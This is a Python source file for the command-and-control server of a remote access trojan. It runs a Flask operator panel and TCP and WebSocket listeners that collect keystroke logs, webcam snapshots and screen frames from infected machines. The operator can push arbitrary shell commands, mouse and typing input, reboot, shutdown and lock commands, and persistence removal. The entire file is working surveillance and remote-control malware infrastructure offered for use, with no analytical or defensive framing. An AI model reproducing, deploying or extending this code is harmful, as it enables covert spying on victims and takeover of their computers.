import socket
import threading
import asyncio
import websockets
import base64
import logging
import time
from flask import Flask, render_template, request, send_file, redirect, url_for
from flask_cors import CORS
import os

# --- Configuration ---
HOST = "0.0.0.0"
TCP_PORT = 5555
WS_CLIENT_PORT = 8765
WS_BROWSER_PORT = 8766
FLASK_PORT = 5000
MAX_FRAME_SIZE = 2 * 1024 * 1024
FRAME_RATE_LIMIT = 1.0 / 6.67  # Match client FPS
FRAME_BUFFER = []
BUFFER_SIZE = 3

clients = []
cmd_output = ""
keylogs = ""
latest_frame = None
frame_lock = threading.Lock()
cmd_lock = threading.Lock()
key_lock = threading.Lock()
browser_ws_clients = set()

# --- TCP Server Setup ---
tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind((HOST, TCP_PORT))
tcp_server.listen()

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


app = Flask(__name__)
CORS(app)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/display")
def display():
    return render_template("display.html")

@app.route("/keylogger")
def keylogger():
    with key_lock:
        logs = keylogs if keylogs else "No keylogs yet."
    return render_template("keylogger.html", logs=logs)

@app.route("/command", methods=["GET", "POST"])
def command():
    global cmd_output
    if request.method == "POST":
        cmd = request.form.get("cmd")
        if cmd:
            for client in clients:
                try:
                    client.send(f"CMD:{cmd}".encode())
                except Exception as e:
                    logging.error(f"Send CMD failed: {e}")
            return redirect(url_for("command"))
    with cmd_lock:
        output = cmd_output
    return render_template("command.html", output=output)

@app.route("/webcam")
def webcam():
    with frame_lock:
        frame = latest_frame
    if frame:
        return render_template("webcam.html", image_data=frame.decode())
    return render_template("webcam.html", image_data=None)

@app.route("/download_webcam")
def download_webcam():
    with frame_lock:
        if latest_frame:
            img_data = base64.b64decode(latest_frame)
            with open("webcam_snapshot.jpg", "wb") as f:
                f.write(img_data)
            return send_file("webcam_snapshot.jpg", as_attachment=True)
    return ("", 204)

@app.route("/control", methods=["GET", "POST"])
def control():
    if request.method == "POST":
        action = request.form.get("action")
        value = request.form.get("value")
        if action == "mouse":
            x, y = value.split(",")
            msg = f"CMD:MOUSE_MOVE:{x}:{y}"
        elif action == "type":
            msg = f"CMD:TYPE:{value}"
        elif action == "remove_persistence":
            msg = "CMD:REMOVE_PERSISTENCE"
        elif action == "reboot":
            msg = "CMD:REBOOT"
        elif action == "shutdown":
            msg = "CMD:SHUTDOWN"
        elif action == "lock":
            msg = "CMD:LOCK"
        else:
            msg = ""
        if msg:
            for client in clients:
                try:
                    client.send(msg.encode())
                except Exception as e:
                    logging.error(f"Control command failed: {e}")
        return redirect(url_for("control"))
    return render_template("control.html")

@app.route("/latest_frame")
def latest_image():
    with frame_lock:
        if latest_frame:
            return base64.b64decode(latest_frame)
        return ("", 204)

@app.route("/help")
def help_page():
    commands = [
        {"command": "CMD:<shell command>", "description": "Execute a shell command"},
        {"command": "CMD:MOUSE_MOVE:x:y", "description": "Move mouse to coordinates (x, y)"},
        {"command": "CMD:TYPE:<text>", "description": "Type given text remotely"},
        {"command": "CMD:REMOVE_PERSISTENCE", "description": "Remove persistence from client"},
        {"command": "CMD:REBOOT", "description": "Reboot the client machine"},
        {"command": "CMD:SHUTDOWN", "description": "Shutdown the client machine"},
        {"command": "CMD:LOCK", "description": "Lock the client machine screen"},
    ]
    return render_template("help.html", commands=commands)

# --- TCP Client Handler ---
def handle_client(client_socket):
    global cmd_output, keylogs
    while True:
        try:
            data = client_socket.recv(8192)
            if not data:
                break
            if data.startswith(b"KEY:"):
                with key_lock:
                    keylogs += data[4:].decode(errors='ignore') + "\n"
            elif data.startswith(b"CMD:") or data.startswith(b"CMD ERROR:"):
                with cmd_lock:
                    cmd_output = data.decode(errors='ignore')
            elif data.startswith(b"WEBCAM:"):
                img_data = data[len("WEBCAM:"):].decode()
                with frame_lock:
                    global latest_frame
                    latest_frame = img_data.encode()
            else:
                logging.info(f"Received: {data[:50]}")
        except Exception as e:
            logging.error(f"TCP client error: {e}")
            break
    client_socket.close()
    if client_socket in clients:
        clients.remove(client_socket)

# --- Accept Clients Thread ---
def accept_clients():
    while True:
        client_socket, addr = tcp_server.accept()
        logging.info(f"Client connected: {addr}")
        clients.append(client_socket)
        threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()

# --- Handle WebSocket Streaming from Client ---
async def handle_client_ws(websocket):
    global latest_frame
    last_send_time = 0
    try:
        async for frame_data in websocket:
            current_time = time.time()
            if len(frame_data) > MAX_FRAME_SIZE:
                logging.warning("Received oversized frame, skipping")
                continue

            if current_time - last_send_time < FRAME_RATE_LIMIT:
                await asyncio.sleep(FRAME_RATE_LIMIT - (current_time - last_send_time))
                continue
            last_send_time = current_time

            with frame_lock:
                latest_frame = frame_data.encode()
                FRAME_BUFFER.append(latest_frame)
                if len(FRAME_BUFFER) > BUFFER_SIZE:
                    FRAME_BUFFER.pop(0)

            disconnected_clients = set()
            for ws_client in browser_ws_clients:
                try:
                    await ws_client.send(frame_data)
                    logging.debug(f"Forwarded frame of size {len(frame_data)} bytes")
                except Exception as e:
                    logging.warning(f"Browser WS send error: {e}")
                    disconnected_clients.add(ws_client)
            
            browser_ws_clients.difference_update(disconnected_clients)
    except Exception as e:
        logging.error(f"WebSocket client error: {e}")

# --- Handle WebSocket to Browser ---
async def handle_browser_ws(websocket):
    browser_ws_clients.add(websocket)
    try:
        with frame_lock:
            for frame in FRAME_BUFFER:
                try:
                    await websocket.send(frame.decode())
                except:
                    pass
        await websocket.wait_closed()
    finally:
        browser_ws_clients.remove(websocket)

# --- Main Entry ---
async def main():
    threading.Thread(target=accept_clients, daemon=True).start()
    threading.Thread(target=lambda: app.run(host=HOST, port=FLASK_PORT, debug=False), daemon=True).start()

    await asyncio.gather(
        websockets.serve(handle_client_ws, HOST, WS_CLIENT_PORT),
        websockets.serve(handle_browser_ws, HOST, WS_BROWSER_PORT),
        asyncio.Future(),
    )

if __name__ == "__main__":
    asyncio.run(main())